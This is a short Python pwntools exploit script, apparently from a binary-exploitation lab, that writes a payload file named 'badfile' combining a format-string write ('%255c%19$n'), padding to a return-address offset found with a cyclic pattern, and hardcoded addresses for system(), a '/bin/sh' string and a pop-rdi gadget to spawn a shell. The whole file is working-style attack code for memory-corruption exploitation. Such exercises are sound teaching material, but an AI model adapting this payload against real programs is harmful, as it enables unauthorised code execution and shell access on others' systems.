from pwn import *

# Fill content with non-zero values
payload = cyclic(300, n=8)
pattern=b'aaaaeaaa' #from gdb
ra_offset = cyclic_find(pattern, n=8)
#foo = p64(0x7ffff7ff1538)
foo = p64(0x555555555283)
zeros = p64(0x0)
system=p64(0x7ffff7dfe2c0)
bin_sh_addr=p64(0x7ffff7f605bd)
pop_rdi_ret_gadget=p64(0x7ffff7fece84)

payload=b'%255c%19$n'
if(len(payload) < ra_offset):
    payload +=b'\n'*(ra_offset-len(payload))

payload+=foo

while (len(payload) % 8 != 0):
    payload+=b'\n'

payload+=system+bin_sh_addr+pop_rdi_ret_gadget

with open("badfile", "wb") as f:
    f.write(payload)
print(payload)
print("len payload: %d" % len(payload))
